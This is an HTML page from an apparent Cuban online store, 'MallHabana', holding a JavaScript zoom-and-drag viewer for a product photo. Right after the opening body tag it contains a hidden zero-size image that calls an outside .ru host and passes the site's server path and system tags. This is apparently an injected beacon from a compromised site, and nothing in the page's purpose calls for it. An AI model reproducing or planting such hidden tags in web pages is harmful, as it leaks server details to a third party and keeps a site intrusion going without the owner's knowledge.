
<html>
<head>
<title>MallHabana - Sus Compras Amigas</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<meta http-equiv="expires" content="-1" />
<meta name="Keywords" content="tienda,shop,departamentos,department,habana,havana,cuba" />
<meta name="Description" content="MallHabana - Sus compras amigas. Servicio especial para Cuba" />
<link href="../styles/base.css" rel="stylesheet" type="text/css" />
<style type="text/css">
body {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	margin: 0px 0px 0px 0px;
	padding: 0px 0px 0px 0px;
}
.productName { position: absolute; left: 20px; top: 20px; font-size: 14px; font-weight: normal; color: #000000; }
div#controles { position: absolute; left: 20px; top: 455px; width:400px; }
</style>
<script type="text/javascript" language="Javascript" src="js/dynapi.js" >
</script>
<script type="text/javascript" language="Javascript">
DynAPI.setLibraryPath('js/lib/');
DynAPI.include('dynapi.api.*');
DynAPI.include('dynapi.event.*');
</script>
<script type="text/javascript" language="Javascript">

var CNT_WIDTH = 400;
var CNT_HEIGHT = 400;
var CNT_MAX_FACTOR = 3.0;
var CNT_LONG_STEP = 0.50;
var CNT_SHORT_STEP = 0.10;

var img;
DynAPI.onLoad = function() {

	var imagenStr = '<img id="zoomimg" src="photoget_web.php?No=1548&Idx=2" width=100% height=100% />';
	var d = new DynLayer(null,20,50,CNT_WIDTH,CNT_HEIGHT,'#FFFFFF');
    var bas = new DynLayer(null,19,49,CNT_WIDTH+2,CNT_HEIGHT+2,'#888888');

	img = d.addChild(new DynLayer(null,0,0,CNT_WIDTH,CNT_HEIGHT,null,null,null,null,imagenStr))

	DynAPI.document.addChild(bas);
	DynAPI.document.addChild(d);

  DragEvent.enableDragEvents(img);
  DragEvent.setDragBoundary(img);

}

var newFactor = 1.0;
var thisFactor = 1.0;
var newDir;

function makeZoom() {
	if (newDir == 'zoom_in' && thisFactor<newFactor) {
		thisFactor += CNT_SHORT_STEP;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x - ((nw-oldw)/2);
		ny = img.y - ((nh-oldh)/2);
		updateZoom(nx, ny,nw, nh);
		setTimeout(makeZoom, 2);
	}
	else if (newDir == 'zoom_out' && thisFactor>newFactor) {
		thisFactor -= CNT_SHORT_STEP;
		if (thisFactor<1) thisFactor = 1;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x + ((oldw-nw)/2);
		ny = img.y + ((oldh-nh)/2);
		updateZoom(nx, ny,nw, nh);
		setTimeout(makeZoom, 2);
	}
}
function makeQuickZoom() {
	if (newDir == 'zoom_in' && thisFactor<newFactor) {
		thisFactor = newFactor;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x - ((nw-oldw)/2);
		ny = img.y - ((nh-oldh)/2);
		updateZoom(nx,ny,nw, nh);
	}
	else if (newDir == 'zoom_out' && thisFactor>newFactor) {
		thisFactor = newFactor;
		if (thisFactor<1) thisFactor = 1;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x + ((oldw-nw)/2);
		ny = img.y + ((oldh-nh)/2);
		updateZoom(nx,ny,nw, nh);
	}
}

function updateZoom(nX, nY, nW, nH) {
  r = nW;
  b = nH;
  l = CNT_WIDTH - nW;
  t = CNT_HEIGHT - nH;
  DragEvent.setDragBoundary(img,t,r,b,l);
	var w=img.w;
	var h=img.h;
	var x = nX;
	var y = nY;
	if (x<l) x=l;
	else if (x+w>r) x=r-w;
	if (y<t) y=t;
	else if (y+h>b) y=b-h;
	img.moveTo(x,y);
	img.setSize(nW,nH);
}


function zoomIn(anim) {
	if (newFactor<CNT_MAX_FACTOR) {
		newFactor += CNT_LONG_STEP;
        newDir = 'zoom_in';
		if (anim) makeZoom();
		else makeQuickZoom();
	}
}

function zoomOut(anim) {
	if (newFactor>1) {
		newFactor -= CNT_LONG_STEP;
		newDir = 'zoom_out';
		if (anim)	makeZoom();
		else makeQuickZoom();
	}
}

function zoomDef(anim) {
	if (newFactor!=1) {
		newFactor = 1;
		newDir = 'zoom_out';
		if (anim)	makeZoom();
		else makeQuickZoom();
		img.moveTo(0,0);
	}

}

</script>
</head>

<body bgcolor="#ffffff" ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>

<div class="productName">TEST 12</div>

<div id="controles">
    <table width="100%" cellpadding="0" cellspacing="0">
        <tr>
            <td>
<a href="javascript:zoomIn(true)"><img src="js/agrandar_en.gif" alt="" border="0" /></a> &nbsp;
<a href="javascript:zoomOut(true)"><img src="js/reducir_en.gif" alt="" border="0" /></a> &nbsp;
<a href="javascript:zoomDef(false)"><img src="js/vistanormal_en.gif" alt="" border="0" /></a>
            </td>
            <td align="right">
                <!--a href="javascript:window.close()">Close</a-->
            </td>
        </tr>
    </table>


</div>

</body>
</html>

